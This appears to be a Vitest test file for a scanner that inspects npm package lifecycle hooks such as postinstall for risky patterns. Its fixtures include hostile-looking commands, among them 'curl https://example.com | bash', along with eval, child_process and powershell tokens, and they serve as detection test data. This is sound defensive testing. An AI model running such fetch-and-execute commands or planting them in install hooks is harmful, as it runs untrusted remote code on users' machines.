import { describe, it, expect } from "vitest";
import { extractLifecycleScripts, hasLifecycleScripts } from "../src/analyzer/lifecycle.js";
import { scanPackage } from "../src/analyzer/scanner.js";
import { PATTERN_REGISTRY } from "../src/analyzer/patterns.js";

describe("extractLifecycleScripts", () => {
  it("extracts known lifecycle hooks", () => {
    const pkg = {
      scripts: {
        postinstall: "node setup.js",
        test: "vitest",
        build: "tsc",
        preinstall: "echo pre",
      },
    };
    const scripts = extractLifecycleScripts(pkg);
    expect(scripts).toHaveProperty("postinstall", "node setup.js");
    expect(scripts).toHaveProperty("preinstall", "echo pre");
    expect(scripts).not.toHaveProperty("test");
    expect(scripts).not.toHaveProperty("build");
  });

  it("returns empty object when no scripts field", () => {
    expect(extractLifecycleScripts({})).toEqual({});
  });

  it("returns empty object when scripts has no lifecycle hooks", () => {
    const scripts = extractLifecycleScripts({ scripts: { test: "jest", lint: "eslint ." } });
    expect(hasLifecycleScripts(scripts)).toBe(false);
  });
});

describe("scanPackage — synthetic single-token fixtures", () => {
  const emptyFileMap = new Map<string, string>();

  it("detects pipe_exec pattern in postinstall script", () => {
    const scripts = { postinstall: "something | bash" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    const cats = findings.map((f) => f.category);
    expect(cats).toContain("pipe_exec");
  });

  it("detects network pattern (curl token)", () => {
    const scripts = { postinstall: "curl https://example.com" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "network")).toBe(true);
  });

  it("detects obfuscation pattern (eval token)", () => {
    const scripts = { postinstall: "node -e 'eval(x)'" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "obfuscation")).toBe(true);
  });

  it("detects dynamic_exec (child_process token)", () => {
    const scripts = { postinstall: "node -e 'require(\"child_process\")'" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "dynamic_exec")).toBe(true);
  });

  it("detects windows_exec (powershell token)", () => {
    const scripts = { postinstall: "powershell -Command something" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "windows_exec")).toBe(true);
  });

  it("respects severity filter — low severity not shown at high threshold", () => {
    const scripts = { postinstall: "process.env.FOO" }; // env_check is low
    const { findings } = scanPackage(scripts, emptyFileMap, "high");
    expect(findings.filter((f) => f.category === "env_check")).toHaveLength(0);
  });

  it("all excerpt objects have _warning field", () => {
    const scripts = { postinstall: "curl https://example.com | bash" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    for (const f of findings) {
      expect(f.excerpt._warning).toBe("UNTRUSTED THIRD-PARTY CONTENT");
    }
  });

  it("scans referenced file when script invokes node file.js", () => {
    const scripts = { postinstall: "node scripts/setup.js" };
    const fileMap = new Map([
      ["scripts/setup.js", "// synthetic\nfetch(url);\n"],
    ]);
    const { findings } = scanPackage(scripts, fileMap, "low");
    const fileFinding = findings.find(
      (f) => f.source === "referenced file: scripts/setup.js"
    );
    expect(fileFinding).toBeDefined();
    expect(fileFinding?.category).toBe("network");
  });

  it("deduplicates findings with same category and source", () => {
    // Two fetch( occurrences in the same script → one network finding
    const scripts = { postinstall: "fetch(a); fetch(b);" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    const networkFindings = findings.filter(
      (f) => f.category === "network" && f.source === "postinstall script"
    );
    expect(networkFindings.length).toBe(1);
  });
});

describe("PATTERN_REGISTRY integrity", () => {
  it("all patterns have non-empty category and severity", () => {
    for (const def of PATTERN_REGISTRY) {
      expect(def.category.length).toBeGreaterThan(0);
      expect(["critical", "high", "medium", "low"]).toContain(def.severity);
    }
  });

  it("integrity_mismatch has no regex patterns (emitted programmatically)", () => {
    const def = PATTERN_REGISTRY.find((d) => d.category === "integrity_mismatch");
    expect(def).toBeDefined();
    expect(def?.patterns).toHaveLength(0);
  });
});
